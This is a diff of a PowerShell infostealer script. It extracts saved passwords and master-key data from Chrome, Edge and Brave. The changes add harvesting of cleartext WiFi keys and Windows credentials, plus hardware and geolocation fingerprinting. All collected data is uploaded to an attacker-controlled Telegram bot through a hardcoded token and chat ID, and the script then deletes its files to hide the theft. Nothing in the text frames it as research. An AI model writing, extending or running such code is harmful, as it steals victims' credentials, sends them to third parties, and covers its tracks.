@@ -1,40 +1,235 @@
-# Multi-Browser Encrypted Password Extraction Script with Telegram Upload
-# Extracts encrypted password data for future decryption from Chrome, Edge, and Brave
+# Enhanced Multi-Browser and Network Password Extraction
+# Removed CSV generation, added network password extraction, improved file naming and cleanup
 
 param(
     [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
     [string]$TelegramChatID = "2047893044"  # Your Chat ID
 )
 
-# Get system information for file naming
-$systemName = $env:COMPUTERNAME
-$ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString
-$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-
-# Create file names with IP address and system name
-$CSVPath = ".\${ipAddress}_${systemName}_${timestamp}.csv"
-$JSONPath = ".\${ipAddress}_${systemName}_${timestamp}.json"
-
-Write-Host "Multi-Browser Encrypted Password Extraction Tool" -ForegroundColor Green
-Write-Host "================================================" -ForegroundColor Green
-Write-Host "Files will be saved as:" -ForegroundColor Yellow
-Write-Host "CSV: $CSVPath" -ForegroundColor Yellow
-Write-Host "JSON: $JSONPath" -ForegroundColor Yellow
-Write-Host "Telegram Chat ID: $TelegramChatID" -ForegroundColor Cyan
-
-# Browser paths configuration
-$browsers = @{
-    "Chrome" = @{
-        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        Name = "Google Chrome"
+# Function to get public IP information
+function Get-PublicIPInfo {
+    try {
+        Write-Host "Getting public IP information..." -ForegroundColor Yellow
+        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
+        return @{
+            PublicIP = $ipInfo.ip
+            Country = $ipInfo.country
+            Region = $ipInfo.region
+            City = $ipInfo.city
+            Org = $ipInfo.org
+            Loc = $ipInfo.loc
+            Timezone = $ipInfo.timezone
+        }
+    } catch {
+        Write-Host "Failed to get public IP information: $($_.Exception.Message)" -ForegroundColor Red
+        return @{
+            PublicIP = "Unknown"
+            Country = "Unknown"
+            Region = "Unknown"
+            City = "Unknown"
+            Org = "Unknown"
+            Loc = "Unknown"
+            Timezone = "Unknown"
+        }
     }
-    "Edge" = @{
-        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-        Name = "Microsoft Edge"
+}
+
+# Function to get detailed system information
+function Get-DetailedSystemInfo {
+    $computerInfo = Get-ComputerInfo
+    $osInfo = Get-WmiObject -Class Win32_OperatingSystem
+    $biosInfo = Get-WmiObject -Class Win32_BIOS
+    $processorInfo = Get-WmiObject -Class Win32_Processor
+    $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
+    
+    return @{
+        ComputerName = $env:COMPUTERNAME
+        UserName = $env:USERNAME
+        OSName = $osInfo.Caption
+        OSVersion = $osInfo.Version
+        OSBuild = $osInfo.BuildNumber
+        BIOSSerial = $biosInfo.SerialNumber
+        Processor = $processorInfo.Name
+        ProcessorCores = $processorInfo.NumberOfCores
+        TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
+        SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
+        SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
+        LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
+        MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
     }
-    "Brave" = @{
-        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-        Name = "Brave Browser"
+}
+
+# Function to extract detailed WiFi information
+function Get-DetailedWiFiInfo {
+    Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
+    
+    $wifiProfiles = @()
+    $wifiInterfaces = @()
+    
+    try {
+        # Get WiFi interface information
+        $interfaceInfo = netsh wlan show interfaces
+        $interfaceDetails = @{}
+        $currentInterface = ""
+        
+        foreach ($line in $interfaceInfo) {
+            if ($line -match "^\s*Name\s*:\s*(.+)") {
+                $currentInterface = $matches[1].Trim()
+                $interfaceDetails[$currentInterface] = @{}
+            } elseif ($currentInterface -and $line -match "^\s*([^:]+)\s*:\s*(.+)") {
+                $key = $matches[1].Trim()
+                $value = $matches[2].Trim()
+                $interfaceDetails[$currentInterface][$key] = $value
+            }
+        }
+        
+        # Get all WiFi profiles
+        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+            $_.ToString().Split(":")[1].Trim()
+        }
+        
+        foreach ($profile in $profiles) {
+            try {
+                # Get detailed WiFi profile information
+                $profileInfo = netsh wlan show profile name="$profile" key=clear
+                $profileDetails = @{}
+                
+                foreach ($line in $profileInfo) {
+                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
+                        $key = $matches[1].Trim()
+                        $value = $matches[2].Trim()
+                        $profileDetails[$key] = $value
+                    }
+                }
+                
+                $password = $profileDetails["Key Content"]
+                $authentication = $profileDetails["Authentication"]
+                $encryption = $profileDetails["Cipher"]
+                
+                $wifiProfiles += @{
+                    SSID = $profile
+                    Password = if ($password) { $password } else { "No password" }
+                    Authentication = $authentication
+                    Encryption = $encryption
+                    ConnectionMode = $profileDetails["Connection mode"]
+                    SSIDName = $profileDetails["SSID name"]
+                    NetworkType = $profileDetails["Network type"]
+                    RadioType = $profileDetails["Radio type"]
+                    VendorExtension = $profileDetails["Vendor extension"]
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            } catch {
+                Write-Host "Error processing WiFi profile $profile : $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
+        
+        # Get current connected WiFi information
+        $currentWifi = netsh wlan show interfaces | Where-Object { $_ -match "SSID" } | ForEach-Object {
+            if ($_ -match "SSID\s*:\s*(.+)") {
+                $matches[1].Trim()
+            }
+        }
+        
+        $wifiData = @{
+            Profiles = $wifiProfiles
+            Interfaces = $interfaceDetails
+            CurrentlyConnected = if ($currentWifi) { $currentWifi } else { "Not connected" }
+            TotalProfiles = $wifiProfiles.Count
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        }
+        
+        return $wifiData
+        
+    } catch {
+        Write-Host "Error extracting WiFi information: $($_.Exception.Message)" -ForegroundColor Red
+        return @{
+            Profiles = @()
+            Interfaces = @{}
+            CurrentlyConnected = "Error"
+            TotalProfiles = 0
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            Error = $_.Exception.Message
+        }
+    }
+}
+
+# Function to extract Windows network credentials (RDP, VPN, etc.)
+function Get-WindowsNetworkCredentials {
+    Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
+    
+    $networkCredentials = @()
+    
+    try {
+        # Extract saved RDP credentials using cmdkey
+        $cmdkeyOutput = cmdkey /list 2>$null
+        
+        $currentTarget = ""
+        foreach ($line in $cmdkeyOutput) {
+            if ($line -match "Target:\s*(.+)") {
+                $currentTarget = $matches[1].Trim()
+            } elseif ($currentTarget -and $line -match "Type:\s*(.+)") {
+                $type = $matches[1].Trim()
+                $networkCredentials += @{
+                    Target = $currentTarget
+                    Type = $type
+                    CredentialType = "RDP/Windows"
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+                $currentTarget = ""
+            }
+        }
+        
+        # Try to extract from Credential Manager (if available)
+        try {
+            $credentialFiles = Get-ChildItem -Path "$env:USERPROFILE\AppData\Local\Microsoft\Credentials" -ErrorAction SilentlyContinue
+            foreach ($file in $credentialFiles) {
+                $networkCredentials += @{
+                    Target = $file.Name
+                    Type = "Encrypted Credential File"
+                    CredentialType = "Windows Vault"
+                    FilePath = $file.FullName
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+            }
+        } catch {
+            Write-Host "Could not access Credential Manager files: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
+        
+        Write-Host "Extracted $($networkCredentials.Count) Windows network credentials" -ForegroundColor Green
+        return $networkCredentials
+        
+    } catch {
+        Write-Host "Error extracting Windows network credentials: $($_.Exception.Message)" -ForegroundColor Red
+        return @()
+    }
+}
+
+# Function to send message to Telegram
+function Send-TelegramMessage {
+    param(
+        [string]$Message
+    )
+    
+    try {
+        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
+        $body = @{
+            chat_id = $TelegramChatID
+            text = $Message
+            parse_mode = "HTML"
+        }
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
+        
+        if ($response.ok) {
+            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
     }
 }
 
@@ -51,8 +246,23 @@ function Send-TelegramFile {
             return $false
         }
         
+        # Wait for file to be fully written
+        $maxWaitTime = 30
+        $waitTime = 0
+        while ($waitTime -lt $maxWaitTime) {
+            try {
+                $file = Get-Item $FilePath
+                $fileSize = $file.Length
+                if ($fileSize -gt 0) {
+                    break
+                }
+            } catch {}
+            Start-Sleep -Seconds 1
+            $waitTime++
+        }
+        
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
         $boundary = [System.Guid]::NewGuid().ToString()
         $LF = "`r`n"
         
@@ -74,6 +284,8 @@ function Send-TelegramFile {
         ) -join $LF
 
         $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
+        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
+        
         $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         
         if ($response.ok) {
@@ -85,34 +297,6 @@ function Send-TelegramFile {
         }
     } catch {
         Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-# Function to send message to Telegram
-function Send-TelegramMessage {
-    param(
-        [string]$Message
-    )
-    
-    try {
-        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
-        $body = @{
-            chat_id = $TelegramChatID
-            text = $Message
-        }
-        
-        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
-        
-        if ($response.ok) {
-            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
-            return $false
-        }
-    } catch {
-        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -316,8 +500,8 @@ FROM logins;
                     
                     $encryptedData += $encryptedEntry
                     
-                    # Add to results for CSV
-                    $results += [PSCustomObject]@{
+                    # Add to results for JSON
+                    $results += @{
                         ID = $entryId
                         Browser = $BrowserName
                         Profile = $profileName
@@ -357,12 +541,111 @@ FROM logins;
 }
 
 # Main execution
-Write-Host "Starting multi-browser encrypted password extraction..." -ForegroundColor Green
+Write-Host "Enhanced Browser and Network Password Extraction Tool" -ForegroundColor Green
+Write-Host "=====================================================" -ForegroundColor Green
 
-# Send start notification to Telegram
-$startMessage = "🔍 Starting browser password extraction on: $systemName ($ipAddress) at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-Send-TelegramMessage -Message $startMessage | Out-Null
+# Get system and location information
+$systemInfo = Get-DetailedSystemInfo
+$ipInfo = Get-PublicIPInfo
+$timestamp = Get-Date -Format "ddMMyyyy"
+$fileId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
 
+# Create file names with the new format
+$browserFilePrefix = "Browser_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
+$networkFilePrefix = "Network_$($ipInfo.PublicIP)_$($ipInfo.Country)_$($ipInfo.City)_${timestamp}_${fileId}"
+
+$BrowserJSONPath = Join-Path $PWD "${browserFilePrefix}.json"
+$NetworkJSONPath = Join-Path $PWD "${networkFilePrefix}.json"
+
+Write-Host "Location Info:" -ForegroundColor Yellow
+Write-Host "Public IP: $($ipInfo.PublicIP)" -ForegroundColor Cyan
+Write-Host "Country: $($ipInfo.Country)" -ForegroundColor Cyan
+Write-Host "Region: $($ipInfo.Region)" -ForegroundColor Cyan
+Write-Host "City: $($ipInfo.City)" -ForegroundColor Cyan
+Write-Host "Files will be saved as:" -ForegroundColor Yellow
+Write-Host "Browser JSON: $BrowserJSONPath" -ForegroundColor Yellow
+Write-Host "Network JSON: $NetworkJSONPath" -ForegroundColor Yellow
+Write-Host "Telegram Chat ID: $TelegramChatID" -ForegroundColor Cyan
+
+# Browser paths configuration
+$browsers = @{
+    "Chrome" = @{
+        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        Name = "Google Chrome"
+    }
+    "Edge" = @{
+        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        Name = "Microsoft Edge"
+    }
+    "Brave" = @{
+        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+        Name = "Brave Browser"
+    }
+}
+
+# Send system information to Telegram first
+$systemMessage = @"
+🖥️ <b>System Information</b>
+• <b>Computer:</b> $($systemInfo.ComputerName)
+• <b>User:</b> $($systemInfo.UserName)
+• <b>OS:</b> $($systemInfo.OSName) ($($systemInfo.OSVersion))
+• <b>Processor:</b> $($systemInfo.Processor) ($($systemInfo.ProcessorCores) cores)
+• <b>Memory:</b> $($systemInfo.TotalMemoryGB) GB
+• <b>Manufacturer:</b> $($systemInfo.SystemManufacturer)
+• <b>Model:</b> $($systemInfo.SystemModel)
+• <b>BIOS Serial:</b> $($systemInfo.BIOSSerial)
+• <b>Local IP:</b> $($systemInfo.LocalIP)
+• <b>MAC Address:</b> $($systemInfo.MACAddress)
+
+🌍 <b>Location Information</b>
+• <b>Public IP:</b> $($ipInfo.PublicIP)
+• <b>Country:</b> $($ipInfo.Country)
+• <b>Region:</b> $($ipInfo.Region)
+• <b>City:</b> $($ipInfo.City)
+• <b>Organization:</b> $($ipInfo.Org)
+• <b>Coordinates:</b> $($ipInfo.Loc)
+• <b>Timezone:</b> $($ipInfo.Timezone)
+
+⏰ <b>Extraction Started:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+
+Write-Host "Sending system information to Telegram..." -ForegroundColor Yellow
+Send-TelegramMessage -Message $systemMessage | Out-Null
+
+# Extract detailed WiFi information
+Write-Host "Extracting detailed WiFi information..." -ForegroundColor Yellow
+$wifiData = Get-DetailedWiFiInfo
+
+# Extract Windows network credentials
+Write-Host "Extracting Windows network credentials..." -ForegroundColor Yellow
+$networkCredentials = Get-WindowsNetworkCredentials
+
+# Combine all network data
+$networkData = @{
+    WiFi = $wifiData
+    WindowsCredentials = $networkCredentials
+    Metadata = @{
+        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        OS = $systemInfo.OSName
+        OSVersion = $systemInfo.OSVersion
+        User = $systemInfo.UserName
+        Machine = $systemInfo.ComputerName
+        PublicIP = $ipInfo.PublicIP
+        Country = $ipInfo.Country
+        Region = $ipInfo.Region
+        City = $ipInfo.City
+        Org = $ipInfo.Org
+        Loc = $ipInfo.Loc
+        Timezone = $ipInfo.Timezone
+        SystemName = $systemInfo.ComputerName
+    }
+}
+
+# Export network data to JSON
+$networkData | ConvertTo-Json -Depth 10 | Out-File -FilePath $NetworkJSONPath -Encoding UTF8
+Write-Host "Network data exported to: $NetworkJSONPath" -ForegroundColor Green
+
+# Install SQLite if needed
 if (-not (Test-Path ".\sqlite3.exe")) {
     if (-not (Install-SQLiteIfNeeded)) {
         Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
@@ -370,6 +653,7 @@ if (-not (Test-Path ".\sqlite3.exe")) {
     }
 }
 
+# Extract browser passwords
 $allSummaryData = @()
 $allDetailedData = @()
 $allMasterKeys = @()
@@ -378,7 +662,6 @@ $allMasterKeys = @()
 foreach ($browserKey in $browsers.Keys) {
     $browser = $browsers[$browserKey]
     Write-Host "`nProcessing $($browser.Name)..." -ForegroundColor Yellow
-    Write-Host "Path: $($browser.Path)" -ForegroundColor Gray
     
     # Extract master key information
     $masterKeyInfo = Get-BrowserMasterKey -BrowserDataPath $browser.Path -BrowserName $browser.Name
@@ -395,101 +678,123 @@ foreach ($browserKey in $browsers.Keys) {
 }
 
 # Display and export results
-if ($allSummaryData.Count -gt 0) {
-    Write-Host "`nSuccessfully extracted $($allSummaryData.Count) encrypted passwords from all browsers!" -ForegroundColor Green
+if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0) {
+    Write-Host "`nSuccessfully extracted data!" -ForegroundColor Green
     
-    # Export summary to CSV
-    try {
-        $allSummaryData | Export-Csv -Path $CSVPath -NoTypeInformation -Encoding UTF8 -Force
-        Write-Host "Summary exported to: $CSVPath" -ForegroundColor Green
-    } catch {
-        Write-Host "CSV export failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    # Export detailed data to JSON
-    try {
-        $exportData = @{
-            Metadata = @{
-                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                TotalEntries = $allSummaryData.Count
-                OS = [System.Environment]::OSVersion.VersionString
-                User = [System.Environment]::UserName
-                Machine = [System.Environment]::MachineName
-                IPAddress = $ipAddress
-                SystemName = $systemName
+    if ($allSummaryData.Count -gt 0) {
+        Write-Host "Browser passwords: $($allSummaryData.Count) entries" -ForegroundColor Green
+        
+        # Export detailed data to JSON
+        try {
+            $exportData = @{
+                Metadata = @{
+                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    TotalEntries = $allSummaryData.Count
+                    OS = $systemInfo.OSName
+                    OSVersion = $systemInfo.OSVersion
+                    User = $systemInfo.UserName
+                    Machine = $systemInfo.ComputerName
+                    PublicIP = $ipInfo.PublicIP
+                    Country = $ipInfo.Country
+                    Region = $ipInfo.Region
+                    City = $ipInfo.City
+                    Org = $ipInfo.Org
+                    Loc = $ipInfo.Loc
+                    Timezone = $ipInfo.Timezone
+                    SystemName = $systemInfo.ComputerName
+                }
+                MasterKeys = $allMasterKeys
+                EncryptedPasswords = $allDetailedData
             }
-            MasterKeys = $allMasterKeys
-            EncryptedPasswords = $allDetailedData
+            
+            $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $BrowserJSONPath -Encoding UTF8
+            Write-Host "Browser data exported to: $BrowserJSONPath" -ForegroundColor Green
+            
+        } catch {
+            Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
         }
-        
-        $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $JSONPath -Encoding UTF8
-        Write-Host "Detailed encrypted data exported to: $JSONPath" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "JSON export failed: $($_.Exception.Message)" -ForegroundColor Red
     }
+    
+    if ($wifiData.Profiles.Count -gt 0) {
+        Write-Host "WiFi passwords: $($wifiData.Profiles.Count) networks found" -ForegroundColor Green
+    }
+    
+    if ($networkCredentials.Count -gt 0) {
+        Write-Host "Windows network credentials: $($networkCredentials.Count) entries found" -ForegroundColor Green
+    }
+    
+    # Wait to ensure files are fully written
+    Write-Host "Waiting for files to be fully written..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 5
     
     # Send files to Telegram
     Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
     
-    $csvCaption = "📊 Browser Password Extraction - CSV Summary`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
-    $jsonCaption = "🔐 Browser Password Extraction - JSON Data`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
+    $filesSent = 0
+    $totalFiles = 0
     
-    $csvSent = Send-TelegramFile -FilePath $CSVPath -Caption $csvCaption
-    $jsonSent = Send-TelegramFile -FilePath $JSONPath -Caption $jsonCaption
+    if ($allSummaryData.Count -gt 0) {
+        $totalFiles += 1
+        $browserCaption = "🌐 Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
+    }
     
-    if ($csvSent -and $jsonSent) {
-        Write-Host "✅ Both files sent to Telegram successfully!" -ForegroundColor Green
-        # Send success message
-        $successMessage = "✅ Password extraction completed!`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nFiles sent successfully!"
-        Send-TelegramMessage -Message $successMessage | Out-Null
+    if ($wifiData.Profiles.Count -gt 0 -or $networkCredentials.Count -gt 0) {
+        $totalFiles += 1
+        $networkCaption = "📶 Network Credentials - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nWiFi Networks: $($wifiData.Profiles.Count)`nWindows Credentials: $($networkCredentials.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        if (Send-TelegramFile -FilePath $NetworkJSONPath -Caption $networkCaption) { $filesSent++ }
+    }
+    
+    # Send completion message
+    $completionMessage = @"
+✅ <b>Extraction Completed Successfully!</b>
+
+🖥️ <b>System:</b> $($systemInfo.ComputerName)
+🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
+📊 <b>Browser Entries:</b> $($allSummaryData.Count)
+📶 <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
+🔐 <b>Windows Credentials:</b> $($networkCredentials.Count)
+📁 <b>Files Sent:</b> $filesSent/$totalFiles
+⏰ <b>Completed:</b> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+    
+    Send-TelegramMessage -Message $completionMessage | Out-Null
+    
+    if ($filesSent -eq $totalFiles) {
+        Write-Host "✅ All files sent to Telegram successfully!" -ForegroundColor Green
     } else {
         Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
-        # Send error message
-        $errorMessage = "⚠️ Password extraction completed with some errors.`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nCheck local files for details."
-        Send-TelegramMessage -Message $errorMessage | Out-Null
     }
-    
-    # Show summary by browser
-    Write-Host "`nExtraction Summary by Browser:" -ForegroundColor Cyan
-    $browserStats = $allSummaryData | Group-Object Browser | ForEach-Object {
-        [PSCustomObject]@{
-            Browser = $_.Name
-            Count = $_.Count
-            Percentage = "$([math]::Round(($_.Count / $allSummaryData.Count) * 100, 2))%"
-        }
-    }
-    $browserStats | Format-Table -AutoSize
-    
-    # Show encryption version summary
-    Write-Host "`nEncryption Version Summary:" -ForegroundColor Cyan
-    $encryptionStats = $allSummaryData | Group-Object EncryptionVersion | ForEach-Object {
-        [PSCustomObject]@{
-            Version = if ($_.Name) { $_.Name } else { "Unknown" }
-            Count = $_.Count
-            Percentage = "$([math]::Round(($_.Count / $allSummaryData.Count) * 100, 2))%"
-        }
-    }
-    $encryptionStats | Format-Table -AutoSize
-    
-    Write-Host "`nSample of extracted data:" -ForegroundColor Cyan
-    $allSummaryData | Select-Object -First 5 | Format-Table -Property Browser, Profile, URL, Username, EncryptionVersion, DataLength -AutoSize
     
 } else {
-    Write-Host "No encrypted passwords found in any browser." -ForegroundColor Yellow
-    # Send empty result message
-    $emptyMessage = "❌ No passwords found in any browser.`nSystem: $systemName`nIP: $ipAddress`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Write-Host "No data found in any browser or network credentials." -ForegroundColor Yellow
+    $emptyMessage = "❌ No passwords found in any browser or network credentials.`nSystem: $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
     Send-TelegramMessage -Message $emptyMessage | Out-Null
 }
 
-Write-Host "`nMulti-browser encrypted data extraction completed." -ForegroundColor Green
+Write-Host "`nEnhanced password extraction completed." -ForegroundColor Green
+
+# Cleanup all files
+Write-Host "Cleaning up all files..." -ForegroundColor Yellow
 
 # Cleanup temporary files
 Get-ChildItem -Path "." -Filter "temp_*.db" -ErrorAction SilentlyContinue | Remove-Item -Force
 Get-ChildItem -Path "." -Filter "temp_*.csv" -ErrorAction SilentlyContinue | Remove-Item -Force
-Write-Host "Temporary files cleaned up." -ForegroundColor Green
 
-# Show final file locations
-Write-Host "`nFinal files created:" -ForegroundColor Green
-Write-Host "CSV: $((Get-Item $CSVPath).FullName)" -ForegroundColor Yellow
-Write-Host "JSON: $((Get-Item $JSONPath).FullName)" -ForegroundColor Yellow
+# Cleanup SQLite
+if (Test-Path ".\sqlite3.exe") {
+    Remove-Item ".\sqlite3.exe" -Force -ErrorAction SilentlyContinue
+}
+
+# Cleanup JSON files after sending to Telegram
+if (Test-Path $BrowserJSONPath) {
+    Remove-Item $BrowserJSONPath -Force -ErrorAction SilentlyContinue
+}
+
+if (Test-Path $NetworkJSONPath) {
+    Remove-Item $NetworkJSONPath -Force -ErrorAction SilentlyContinue
+}
+
+Write-Host "All files cleaned up." -ForegroundColor Green
